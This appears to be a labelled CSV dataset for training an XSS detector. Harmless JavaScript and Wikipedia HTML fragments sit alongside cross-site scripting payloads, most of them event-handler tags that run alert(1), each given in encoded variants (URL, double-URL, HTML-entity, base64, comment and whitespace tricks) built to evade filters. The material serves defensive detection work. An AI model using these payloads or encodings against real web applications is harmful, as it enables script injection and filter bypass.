sample_id,variant_id,technique,payload_original,payload_obfuscated,label
496,3,urlencode,"<nobr draggable=""true"" ondragleave=""alert(1)"">test</nobr>",%3Cnobr%20draggable%3D%22true%22%20ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fnobr%3E,1
497,0,none,var clickpos = timepicker._pos(e); var x = clickpos.x - this.x0; var y = clickpos.y - this.y0;,var clickpos = timepicker._pos(e); var x = clickpos.x - this.x0; var y = clickpos.y - this.y0;,0
498,0,none,"</span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""http://www.techinsider.io/mysterious-artificial-intelligence-company-elon-musk-investment-2015-10"">""the mysterious artificial intelligence company elon musk invested in is developing game-changing smart computers"" </a>. <i>tech insider </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20151030165333/http://www.techinsider.io/mysterious-artificial-intelligence-company-elon-musk-investment-2015-10"">archived </a> from the original on 30 october 2015<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">30 october","</span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""http://www.techinsider.io/mysterious-artificial-intelligence-company-elon-musk-investment-2015-10"">""the mysterious artificial intelligence company elon musk invested in is developing game-changing smart computers"" </a>. <i>tech insider </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20151030165333/http://www.techinsider.io/mysterious-artificial-intelligence-company-elon-musk-investment-2015-10"">archived </a> from the original on 30 october 2015<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">30 october",0
499,0,none,"duration: 225, easing: 'easeinoutquad', complete: function (anim) {","duration: 225, easing: 'easeinoutquad', complete: function (anim) {",0
500,0,none,$('input.autocomplete').autocomplete({,$('input.autocomplete').autocomplete({,0
501,1,html_then_urlencode,<spacer onpointerout=alert(1)>xss</spacer>,%26lt%3Bspacer%20onpointerout%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Fspacer%26gt%3B,1
501,2,html_entities,<spacer onpointerout=alert(1)>xss</spacer>,&lt;spacer onpointerout=alert(1)&gt;xss&lt;/spacer&gt;,1
501,3,double_urlencode,<spacer onpointerout=alert(1)>xss</spacer>,%253Cspacer%2520onpointerout%253Dalert%25281%2529%253Exss%253C%252Fspacer%253E,1
502,1,urlencode,"<tfoot onbeforecut=""alert(1)"" contenteditable>test</tfoot>",%3Ctfoot%20onbeforecut%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Ftfoot%3E,1
502,2,html_then_urlencode,"<tfoot onbeforecut=""alert(1)"" contenteditable>test</tfoot>",%26lt%3Btfoot%20onbeforecut%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%26gt%3Btest%26lt%3B%2Ftfoot%26gt%3B,1
502,3,html_entities,"<tfoot onbeforecut=""alert(1)"" contenteditable>test</tfoot>",&lt;tfoot onbeforecut=&quot;alert(1)&quot; contenteditable&gt;test&lt;/tfoot&gt;,1
503,1,whitespace_noise,<b onpointerenter=alert(1)>xss</b>,<b onpointerenter=alert(1) >xss</b>,1
503,2,base64,<b onpointerenter=alert(1)>xss</b>,PGIgb25wb2ludGVyZW50ZXI9YWxlcnQoMSk+eHNzPC9iPg==,1
503,3,comment_marker,<b onpointerenter=alert(1)>xss</b>,<b onpointer/*OBF*/enter=alert(1)>xss</b>,1
504,0,none,return this._element.classlist.contains(class_name_fade$3); } _triggerbackdroptransition() {,return this._element.classlist.contains(class_name_fade$3); } _triggerbackdroptransition() {,0
505,0,none,"constructor(el, options) { super(carousel, el, options); this.el.m_carousel = this;","constructor(el, options) { super(carousel, el, options); this.el.m_carousel = this;",0
506,0,none,"_inherits(timepicker, _component16); function timepicker(el, options) { _classcallcheck(this, timepicker);","_inherits(timepicker, _component16); function timepicker(el, options) { _classcallcheck(this, timepicker);",0
507,0,none,var index = this.center + n,var index = this.center + n,0
508,1,html_entities,"<code oncontextmenu=""alert(1)"">test</code>",&lt;code oncontextmenu=&quot;alert(1)&quot;&gt;test&lt;/code&gt;,1
508,2,base64,"<code oncontextmenu=""alert(1)"">test</code>",PGNvZGUgb25jb250ZXh0bWVudT0iYWxlcnQoMSkiPnRlc3Q8L2NvZGU+,1
508,3,comment_marker,"<code oncontextmenu=""alert(1)"">test</code>","<code oncontextmenu=""alert(1)"">test</code>",1
509,0,none,parsed.tooltips = [],parsed.tooltips = [],0
510,0,none,}; } function offset(_ref2) {,}; } function offset(_ref2) {,0
511,0,none,"return z(c, { children: [], animatables: b, animations: a, duration: r(""duration"", a, c, d), delay: r(""delay"", a, c, d) })","return z(c, { children: [], animatables: b, animations: a, duration: r(""duration"", a, c, d), delay: r(""delay"", a, c, d) })",0
512,1,base64,<dialog onpointerover=alert(1)>xss</dialog>,PGRpYWxvZyBvbnBvaW50ZXJvdmVyPWFsZXJ0KDEpPnhzczwvZGlhbG9nPg==,1
512,2,urlencode,<dialog onpointerover=alert(1)>xss</dialog>,%3Cdialog%20onpointerover%3Dalert%281%29%3Exss%3C%2Fdialog%3E,1
512,3,double_urlencode,<dialog onpointerover=alert(1)>xss</dialog>,%253Cdialog%2520onpointerover%253Dalert%25281%2529%253Exss%253C%252Fdialog%253E,1
513,1,whitespace_noise,"<style>:target {transform: rotate(180deg);}</style><applet id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></applet>","<style>  :target {transform: rotate(180deg);}</  style><applet id=x style=""transition:transform 2s"" ontransitionrun= alert( 1)> </  applet>",1
513,2,html_entities,"<style>:target {transform: rotate(180deg);}</style><applet id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></applet>",&lt;style&gt;:target {transform: rotate(180deg);}&lt;/style&gt;&lt;applet id=x style=&quot;transition:transform 2s&quot; ontransitionrun=alert(1)&gt;&lt;/applet&gt;,1
513,3,base64,"<style>:target {transform: rotate(180deg);}</style><applet id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></applet>",PHN0eWxlPjp0YXJnZXQge3RyYW5zZm9ybTogcm90YXRlKDE4MGRlZyk7fTwvc3R5bGU+PGFwcGxldCBpZD14IHN0eWxlPSJ0cmFuc2l0aW9uOnRyYW5zZm9ybSAycyIgb250cmFuc2l0aW9ucnVuPWFsZXJ0KDEpPjwvYXBwbGV0Pg==,1
514,0,none,"root.scrollto({ top: height, behavior: 'smooth'","root.scrollto({ top: height, behavior: 'smooth'",0
515,0,none,let ancestor = this.placeholder[0].parentnode,let ancestor = this.placeholder[0].parentnode,0
516,1,double_urlencode,<ins id=x tabindex=1 ondeactivate=alert(1)></ins><input id=y autofocus>,%253Cins%2520id%253Dx%2520tabindex%253D1%2520ondeactivate%253Dalert%25281%2529%253E%253C%252Fins%253E%253Cinput%2520id%253Dy%2520autofocus%253E,1
516,2,urlencode,<ins id=x tabindex=1 ondeactivate=alert(1)></ins><input id=y autofocus>,%3Cins%20id%3Dx%20tabindex%3D1%20ondeactivate%3Dalert%281%29%3E%3C%2Fins%3E%3Cinput%20id%3Dy%20autofocus%3E,1
516,3,base64,<ins id=x tabindex=1 ondeactivate=alert(1)></ins><input id=y autofocus>,PGlucyBpZD14IHRhYmluZGV4PTEgb25kZWFjdGl2YXRlPWFsZXJ0KDEpPjwvaW5zPjxpbnB1dCBpZD15IGF1dG9mb2N1cz4=,1
517,0,none,} function islayoutviewport() { return !/^((?!chrome|android).)*safari/i.test(getuastring());,} function islayoutviewport() { return !/^((?!chrome|android).)*safari/i.test(getuastring());,0
518,0,none,"return rgb; } rgb = rgb.match(/^rgb\((\d+),\s*(\d+),\s*(\d+)\)$/);","return rgb; } rgb = rgb.match(/^rgb\((\d+),\s*(\d+),\s*(\d+)\)$/);",0
519,0,none,"m = l + (h - l) / 2, n = a(m, c, b) - k, 0 < n ? h = m : l = m","m = l + (h - l) / 2, n = a(m, c, b) - k, 0 < n ? h = m : l = m",0
520,1,base64,<sub id=x tabindex=1 onfocusin=alert(1)></sub>,PHN1YiBpZD14IHRhYmluZGV4PTEgb25mb2N1c2luPWFsZXJ0KDEpPjwvc3ViPg==,1
520,2,html_then_urlencode,<sub id=x tabindex=1 onfocusin=alert(1)></sub>,%26lt%3Bsub%20id%3Dx%20tabindex%3D1%20onfocusin%3Dalert%281%29%26gt%3B%26lt%3B%2Fsub%26gt%3B,1
520,3,double_urlencode,<sub id=x tabindex=1 onfocusin=alert(1)></sub>,%253Csub%2520id%253Dx%2520tabindex%253D1%2520onfocusin%253Dalert%25281%2529%253E%253C%252Fsub%253E,1
521,0,none,"function parallax(el, options) {","function parallax(el, options) {",0
522,1,base64,"<caption onkeypress=""alert(1)"" contenteditable>test</caption>",PGNhcHRpb24gb25rZXlwcmVzcz0iYWxlcnQoMSkiIGNvbnRlbnRlZGl0YWJsZT50ZXN0PC9jYXB0aW9uPg==,1
522,2,comment_marker,"<caption onkeypress=""alert(1)"" contenteditable>test</caption>","<caption onkeypress=""alert(1)"" contenteditable>test</caption>",1
522,3,double_urlencode,"<caption onkeypress=""alert(1)"" contenteditable>test</caption>",%253Ccaption%2520onkeypress%253D%2522alert%25281%2529%2522%2520contenteditable%253Etest%253C%252Fcaption%253E,1
523,0,none,"eventhandler.on(document, event_click_data_api, selector_data_toggle, event => {","eventhandler.on(document, event_click_data_api, selector_data_toggle, event => {",0
524,0,none,} const totype = object => { if (object === null || object === undefined) {,} const totype = object => { if (object === null || object === undefined) {,0
525,0,none,easing: 'easeoutquad' }); this._enablebodyscrolling();,easing: 'easeoutquad' }); this._enablebodyscrolling();,0
526,0,none,} this._setupeventhandlers(); },} this._setupeventhandlers(); },0
527,0,none,} _removeeventhandlers() { if (modal._count === 0) {,} _removeeventhandlers() { if (modal._count === 0) {,0
528,0,none,extraclass: this._resolvepossiblefunction(this._config.customclass),extraclass: this._resolvepossiblefunction(this._config.customclass),0
529,1,html_entities,<progress onpointerdown=alert(1)>xss</progress>,&lt;progress onpointerdown=alert(1)&gt;xss&lt;/progress&gt;,1
529,2,whitespace_noise,<progress onpointerdown=alert(1)>xss</progress>,<progress onpointerdown=alert(1)>xss</progress>,1
529,3,double_urlencode,<progress onpointerdown=alert(1)>xss</progress>,%253Cprogress%2520onpointerdown%253Dalert%25281%2529%253Exss%253C%252Fprogress%253E,1
530,1,html_entities,"<sub onbeforecut=""alert(1)"" contenteditable>test</sub>",&lt;sub onbeforecut=&quot;alert(1)&quot; contenteditable&gt;test&lt;/sub&gt;,1
530,2,whitespace_noise,"<sub onbeforecut=""alert(1)"" contenteditable>test</sub>","<sub onbeforecut=""alert(1)"" contenteditable>test</sub>",1
530,3,comment_marker,"<sub onbeforecut=""alert(1)"" contenteditable>test</sub>","<sub onbefo/*OBF*/recut=""alert(1)"" contenteditable>test</sub>",1
531,1,urlencode,"<noembed onmousedown=""alert(1)"">test</noembed>",%3Cnoembed%20onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fnoembed%3E,1
531,2,comment_marker,"<noembed onmousedown=""alert(1)"">test</noembed>","<noembed on/*OBF*/mousedown=""alert(1)"">test</noembed>",1
531,3,html_entities,"<noembed onmousedown=""alert(1)"">test</noembed>",&lt;noembed onmousedown=&quot;alert(1)&quot;&gt;test&lt;/noembed&gt;,1
532,1,double_urlencode,"<menuitem onkeyup=""alert(1)"" contenteditable>test</menuitem>",%253Cmenuitem%2520onkeyup%253D%2522alert%25281%2529%2522%2520contenteditable%253Etest%253C%252Fmenuitem%253E,1
532,2,html_entities,"<menuitem onkeyup=""alert(1)"" contenteditable>test</menuitem>",&lt;menuitem onkeyup=&quot;alert(1)&quot; contenteditable&gt;test&lt;/menuitem&gt;,1
532,3,comment_marker,"<menuitem onkeyup=""alert(1)"" contenteditable>test</menuitem>","<menuitem onkeyup=""alert/*OBF*/(1)"" contenteditable>test/*OBF*/</menu/*OBF*/item>",1
533,0,none,$(this.options.getactiveelement(scrollspy._visibleelements[0].attr('id'))).addclass(this.options.activeclass); } },$(this.options.getactiveelement(scrollspy._visibleelements[0].attr('id'))).addclass(this.options.activeclass); } },0
534,0,none,"x: reference.x - element.width,","x: reference.x - element.width,",0
535,1,base64,<link onpointerleave=alert(1)>xss</link>,PGxpbmsgb25wb2ludGVybGVhdmU9YWxlcnQoMSk+eHNzPC9saW5rPg==,1
535,2,double_urlencode,<link onpointerleave=alert(1)>xss</link>,%253Clink%2520onpointerleave%253Dalert%25281%2529%253Exss%253C%252Flink%253E,1
535,3,html_then_urlencode,<link onpointerleave=alert(1)>xss</link>,%26lt%3Blink%20onpointerleave%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Flink%26gt%3B,1
536,0,none,length = this.length = elems.length; for (; i < length; i++) { this[i] = elems[i];,length = this.length = elems.length; for (; i < length; i++) { this[i] = elems[i];,0
537,1,double_urlencode,"<style>:target {transform: rotate(180deg);}</style><title id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></title>",%253Cstyle%253E%253Atarget%2520%257Btransform%253A%2520rotate%2528180deg%2529%253B%257D%253C%252Fstyle%253E%253Ctitle%2520id%253Dx%2520style%253D%2522transition%253Atransform%25202s%2522%2520ontransitionrun%253Dalert%25281%2529%253E%253C%252Ftitle%253E,1
537,2,urlencode,"<style>:target {transform: rotate(180deg);}</style><title id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></title>",%3Cstyle%3E%3Atarget%20%7Btransform%3A%20rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Ctitle%20id%3Dx%20style%3D%22transition%3Atransform%202s%22%20ontransitionrun%3Dalert%281%29%3E%3C%2Ftitle%3E,1
537,3,base64,"<style>:target {transform: rotate(180deg);}</style><title id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></title>",PHN0eWxlPjp0YXJnZXQge3RyYW5zZm9ybTogcm90YXRlKDE4MGRlZyk7fTwvc3R5bGU+PHRpdGxlIGlkPXggc3R5bGU9InRyYW5zaXRpb246dHJhbnNmb3JtIDJzIiBvbnRyYW5zaXRpb25ydW49YWxlcnQoMSk+PC90aXRsZT4=,1
538,0,none,this._showrangebubble(); } let offsetleft = this._calcrangeoffset();,this._showrangebubble(); } let offsetleft = this._calcrangeoffset();,0
539,1,urlencode,"<style>@keyframes x{}</style><div style=""animation-name:x"" onanimationstart=""alert(1)""></div>",%3Cstyle%3E%40keyframes%20x%7B%7D%3C%2Fstyle%3E%3Cdiv%20style%3D%22animation-name%3Ax%22%20onanimationstart%3D%22alert%281%29%22%3E%3C%2Fdiv%3E,1
539,2,base64,"<style>@keyframes x{}</style><div style=""animation-name:x"" onanimationstart=""alert(1)""></div>",PHN0eWxlPkBrZXlmcmFtZXMgeHt9PC9zdHlsZT48ZGl2IHN0eWxlPSJhbmltYXRpb24tbmFtZTp4IiBvbmFuaW1hdGlvbnN0YXJ0PSJhbGVydCgxKSI+PC9kaXY+,1
539,3,double_urlencode,"<style>@keyframes x{}</style><div style=""animation-name:x"" onanimationstart=""alert(1)""></div>",%253Cstyle%253E%2540keyframes%2520x%257B%257D%253C%252Fstyle%253E%253Cdiv%2520style%253D%2522animation-name%253Ax%2522%2520onanimationstart%253D%2522alert%25281%2529%2522%253E%253C%252Fdiv%253E,1
540,0,none,const class_name_pointer_event = 'pointer-event' const swipe_threshold = 40 const default = {,const class_name_pointer_event = 'pointer-event' const swipe_threshold = 40 const default = {,0
541,0,none,state.modifiersdata.popperoffsets.y += y,state.modifiersdata.popperoffsets.y += y,0
542,1,html_entities,"<hr ondblclick=""alert(1)"">test</hr>",&lt;hr ondblclick=&quot;alert(1)&quot;&gt;test&lt;/hr&gt;,1
542,2,urlencode,"<hr ondblclick=""alert(1)"">test</hr>",%3Chr%20ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fhr%3E,1
542,3,base64,"<hr ondblclick=""alert(1)"">test</hr>",PGhyIG9uZGJsY2xpY2s9ImFsZXJ0KDEpIj50ZXN0PC9ocj4=,1
543,0,none,"typeof define === 'function' && define.amd ? define(['../dom/event-handler', './config', './index'], factory) : (global = typeof globalthis !== 'undefined' ? globalthis : global || self, global.swipe = factory(global.eventhandler, global.config, global.index)); })(this, (function (eventhandler, config, index_js) { 'use strict';","typeof define === 'function' && define.amd ? define(['../dom/event-handler', './config', './index'], factory) : (global = typeof globalthis !== 'undefined' ? globalthis : global || self, global.swipe = factory(global.eventhandler, global.config, global.index)); })(this, (function (eventhandler, config, index_js) { 'use strict';",0
544,1,whitespace_noise,"<datalist draggable=""true"" ondragenter=""alert(1)"">test</datalist>","<datalist draggable=""true""  ondragenter=""alert(1)"" >test</ datalist>  ",1
544,2,base64,"<datalist draggable=""true"" ondragenter=""alert(1)"">test</datalist>",PGRhdGFsaXN0IGRyYWdnYWJsZT0idHJ1ZSIgb25kcmFnZW50ZXI9ImFsZXJ0KDEpIj50ZXN0PC9kYXRhbGlzdD4=,1
544,3,html_entities,"<datalist draggable=""true"" ondragenter=""alert(1)"">test</datalist>",&lt;datalist draggable=&quot;true&quot; ondragenter=&quot;alert(1)&quot;&gt;test&lt;/datalist&gt;,1
545,1,urlencode,<center onblur=alert(1) tabindex=1 id=x></center><input autofocus>,%3Ccenter%20onblur%3Dalert%281%29%20tabindex%3D1%20id%3Dx%3E%3C%2Fcenter%3E%3Cinput%20autofocus%3E,1
545,2,base64,<center onblur=alert(1) tabindex=1 id=x></center><input autofocus>,PGNlbnRlciBvbmJsdXI9YWxlcnQoMSkgdGFiaW5kZXg9MSBpZD14PjwvY2VudGVyPjxpbnB1dCBhdXRvZm9jdXM+,1
545,3,double_urlencode,<center onblur=alert(1) tabindex=1 id=x></center><input autofocus>,%253Ccenter%2520onblur%253Dalert%25281%2529%2520tabindex%253D1%2520id%253Dx%253E%253C%252Fcenter%253E%253Cinput%2520autofocus%253E,1
546,0,none,_handleselectchange(e) {,_handleselectchange(e) {,0
547,1,urlencode,<frame id=x tabindex=1 onactivate=alert(1)></frame>,%3Cframe%20id%3Dx%20tabindex%3D1%20onactivate%3Dalert%281%29%3E%3C%2Fframe%3E,1
547,2,base64,<frame id=x tabindex=1 onactivate=alert(1)></frame>,PGZyYW1lIGlkPXggdGFiaW5kZXg9MSBvbmFjdGl2YXRlPWFsZXJ0KDEpPjwvZnJhbWU+,1
547,3,html_entities,<frame id=x tabindex=1 onactivate=alert(1)></frame>,&lt;frame id=x tabindex=1 onactivate=alert(1)&gt;&lt;/frame&gt;,1
548,1,urlencode,"<style>@keyframes x{}</style><legend style=""animation-name:x"" onanimationstart=""alert(1)""></legend>",%3Cstyle%3E%40keyframes%20x%7B%7D%3C%2Fstyle%3E%3Clegend%20style%3D%22animation-name%3Ax%22%20onanimationstart%3D%22alert%281%29%22%3E%3C%2Flegend%3E,1
548,2,double_urlencode,"<style>@keyframes x{}</style><legend style=""animation-name:x"" onanimationstart=""alert(1)""></legend>",%253Cstyle%253E%2540keyframes%2520x%257B%257D%253C%252Fstyle%253E%253Clegend%2520style%253D%2522animation-name%253Ax%2522%2520onanimationstart%253D%2522alert%25281%2529%2522%253E%253C%252Flegend%253E,1
548,3,html_entities,"<style>@keyframes x{}</style><legend style=""animation-name:x"" onanimationstart=""alert(1)""></legend>",&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;legend style=&quot;animation-name:x&quot; onanimationstart=&quot;alert(1)&quot;&gt;&lt;/legend&gt;,1
549,0,none,if (e.target && $trigger.length) { let sidenavid = m.getidfromtrigger($trigger[0]); let sidenavinstance = document.getelementbyid(sidenavid).m_sidenav;,if (e.target && $trigger.length) { let sidenavid = m.getidfromtrigger($trigger[0]); let sidenavinstance = document.getelementbyid(sidenavid).m_sidenav;,0
550,1,double_urlencode,<isindex type=submit formaction=javascript:alert(1)>,%253Cisindex%2520type%253Dsubmit%2520formaction%253Djavascript%253Aalert%25281%2529%253E,1
550,2,base64,<isindex type=submit formaction=javascript:alert(1)>,PGlzaW5kZXggdHlwZT1zdWJtaXQgZm9ybWFjdGlvbj1qYXZhc2NyaXB0OmFsZXJ0KDEpPg==,1
550,3,html_then_urlencode,<isindex type=submit formaction=javascript:alert(1)>,%26lt%3Bisindex%20type%3Dsubmit%20formaction%3Djavascript%3Aalert%281%29%26gt%3B,1
551,0,none,"<ul><li><a href=""#citerefacm1998"">acm 1998 </a>, i.2.1 </li>","<ul><li><a href=""#citerefacm1998"">acm 1998 </a>, i.2.1 </li>",0
552,0,none,options.onfirstupdate(state); } }); // modifiers have the ability to execute arbitrary code before the first,options.onfirstupdate(state); } }); // modifiers have the ability to execute arbitrary code before the first,0
553,0,none,"if (!arevalidelements(reference, popper)) {","if (!arevalidelements(reference, popper)) {",0
554,1,html_then_urlencode,"<samp ondblclick=""alert(1)"">test</samp>",%26lt%3Bsamp%20ondblclick%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Fsamp%26gt%3B,1
554,2,urlencode,"<samp ondblclick=""alert(1)"">test</samp>",%3Csamp%20ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fsamp%3E,1
554,3,whitespace_noise,"<samp ondblclick=""alert(1)"">test</samp>","<samp ondblclick=""alert(  1)"">test</samp>  ",1
555,1,html_entities,"<kbd onclick=""alert(1)"">test</kbd>",&lt;kbd onclick=&quot;alert(1)&quot;&gt;test&lt;/kbd&gt;,1
555,2,urlencode,"<kbd onclick=""alert(1)"">test</kbd>",%3Ckbd%20onclick%3D%22alert%281%29%22%3Etest%3C%2Fkbd%3E,1
555,3,comment_marker,"<kbd onclick=""alert(1)"">test</kbd>","<kbd onclick=""ale/*OBF*/rt(1)"">test</kbd>",1
556,1,comment_marker,<listing id=x tabindex=1 onbeforedeactivate=alert(1)></listing><input autofocus>,<listing id=x tabindex=1 onbeforedeactivate=alert/*OBF*/(1)></listing><input/*OBF*/ autofoc/*OBF*/us>,1
556,2,urlencode,<listing id=x tabindex=1 onbeforedeactivate=alert(1)></listing><input autofocus>,%3Clisting%20id%3Dx%20tabindex%3D1%20onbeforedeactivate%3Dalert%281%29%3E%3C%2Flisting%3E%3Cinput%20autofocus%3E,1
556,3,base64,<listing id=x tabindex=1 onbeforedeactivate=alert(1)></listing><input autofocus>,PGxpc3RpbmcgaWQ9eCB0YWJpbmRleD0xIG9uYmVmb3JlZGVhY3RpdmF0ZT1hbGVydCgxKT48L2xpc3Rpbmc+PGlucHV0IGF1dG9mb2N1cz4=,1
557,1,whitespace_noise,"<colgroup oncopy=""alert(1)"" contenteditable>test</colgroup>","<  colgroup oncopy=""alert(1)""  contenteditable>test</colgroup>",1
557,2,html_entities,"<colgroup oncopy=""alert(1)"" contenteditable>test</colgroup>",&lt;colgroup oncopy=&quot;alert(1)&quot; contenteditable&gt;test&lt;/colgroup&gt;,1
557,3,urlencode,"<colgroup oncopy=""alert(1)"" contenteditable>test</colgroup>",%3Ccolgroup%20oncopy%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fcolgroup%3E,1
558,1,double_urlencode,<script>ondevicemotion=settimeout;event.prototype.tostring=urierror.prototype.tostring;event.prototype.message='alert\x281\x29'</script>,%253Cscript%253Eondevicemotion%253Dsettimeout%253Bevent.prototype.tostring%253Durierror.prototype.tostring%253Bevent.prototype.message%253D%2527alert%255Cx281%255Cx29%2527%253C%252Fscript%253E,1
558,2,base64,<script>ondevicemotion=settimeout;event.prototype.tostring=urierror.prototype.tostring;event.prototype.message='alert\x281\x29'</script>,PHNjcmlwdD5vbmRldmljZW1vdGlvbj1zZXR0aW1lb3V0O2V2ZW50LnByb3RvdHlwZS50b3N0cmluZz11cmllcnJvci5wcm90b3R5cGUudG9zdHJpbmc7ZXZlbnQucHJvdG90eXBlLm1lc3NhZ2U9J2FsZXJ0XHgyODFceDI5Jzwvc2NyaXB0Pg==,1
558,3,html_entities,<script>ondevicemotion=settimeout;event.prototype.tostring=urierror.prototype.tostring;event.prototype.message='alert\x281\x29'</script>,&lt;script&gt;ondevicemotion=settimeout;event.prototype.tostring=urierror.prototype.tostring;event.prototype.message=&#x27;alert\x281\x29&#x27;&lt;/script&gt;,1
559,0,none,"<li><a href=""/wiki/hypostatic_abstraction"" title=""hypostatic abstraction"">hypostatic abstraction </a> </li>","<li><a href=""/wiki/hypostatic_abstraction"" title=""hypostatic abstraction"">hypostatic abstraction </a> </li>",0
560,0,none,"</span> <span class=""toctext"">finance and economics","</span> <span class=""toctext"">finance and economics",0
561,1,html_entities,<caption onpointerover=alert(1)>xss</caption>,&lt;caption onpointerover=alert(1)&gt;xss&lt;/caption&gt;,1
561,2,base64,<caption onpointerover=alert(1)>xss</caption>,PGNhcHRpb24gb25wb2ludGVyb3Zlcj1hbGVydCgxKT54c3M8L2NhcHRpb24+,1
561,3,html_then_urlencode,<caption onpointerover=alert(1)>xss</caption>,%26lt%3Bcaption%20onpointerover%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Fcaption%26gt%3B,1
562,1,html_then_urlencode,"<style>:target {color: red;}</style><b id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></b>",%26lt%3Bstyle%26gt%3B%3Atarget%20%7Bcolor%3A%20red%3B%7D%26lt%3B%2Fstyle%26gt%3B%26lt%3Bb%20id%3Dx%20style%3D%26quot%3Btransition%3Acolor%2010s%26quot%3B%20ontransitioncancel%3Dalert%281%29%26gt%3B%26lt%3B%2Fb%26gt%3B,1
562,2,urlencode,"<style>:target {color: red;}</style><b id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></b>",%3Cstyle%3E%3Atarget%20%7Bcolor%3A%20red%3B%7D%3C%2Fstyle%3E%3Cb%20id%3Dx%20style%3D%22transition%3Acolor%2010s%22%20ontransitioncancel%3Dalert%281%29%3E%3C%2Fb%3E,1
562,3,base64,"<style>:target {color: red;}</style><b id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></b>",PHN0eWxlPjp0YXJnZXQge2NvbG9yOiByZWQ7fTwvc3R5bGU+PGIgaWQ9eCBzdHlsZT0idHJhbnNpdGlvbjpjb2xvciAxMHMiIG9udHJhbnNpdGlvbmNhbmNlbD1hbGVydCgxKT48L2I+,1
563,0,none,_ordertodirection(order) { if (isrtl()) { return order === order_prev ? direction_left : direction_right;,_ordertodirection(order) { if (isrtl()) { return order === order_prev ? direction_left : direction_right;,0
564,0,none,if (e.type === 'touchstart') {,if (e.type === 'touchstart') {,0
565,0,none,if (!isnan(maxmonth) && this._m > maxmonth) {,if (!isnan(maxmonth) && this._m > maxmonth) {,0
566,0,none,}); } $(this.thumb).removeclass('active');,}); } $(this.thumb).removeclass('active');,0
567,0,none,this.wrapper.append(this.el); } if (!this.contentel) {,this.wrapper.append(this.el); } if (!this.contentel) {,0
568,0,none,"return; } var _options$mainaxis = options.mainaxis,","return; } var _options$mainaxis = options.mainaxis,",0
569,0,none,if (newoption) { if (!this.ismultiple) { collection.find('li.selected').removeclass('selected');,if (newoption) { if (!this.ismultiple) { collection.find('li.selected').removeclass('selected');,0
570,1,html_then_urlencode,<li onpointerout=alert(1)>xss</li>,%26lt%3Bli%20onpointerout%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Fli%26gt%3B,1
570,2,comment_marker,<li onpointerout=alert(1)>xss</li>,<li onpointerout=alert(1)>xss</li>,1
570,3,base64,<li onpointerout=alert(1)>xss</li>,PGxpIG9ucG9pbnRlcm91dD1hbGVydCgxKT54c3M8L2xpPg==,1
571,0,none,"onclosestart: this.options.onclosestart,","onclosestart: this.options.onclosestart,",0
572,0,none,"this.xnumsteps = this.xsteps.slice(0); for ( index = 0; index < this.xnumsteps.length; index++ ) { handlesteppoint(index, this.xnumsteps[index], this);","this.xnumsteps = this.xsteps.slice(0); for ( index = 0; index < this.xnumsteps.length; index++ ) { handlesteppoint(index, this.xnumsteps[index], this);",0
573,0,none,"'"">' + this.options.i18n.cancel + '</button>'","'"">' + this.options.i18n.cancel + '</button>'",0
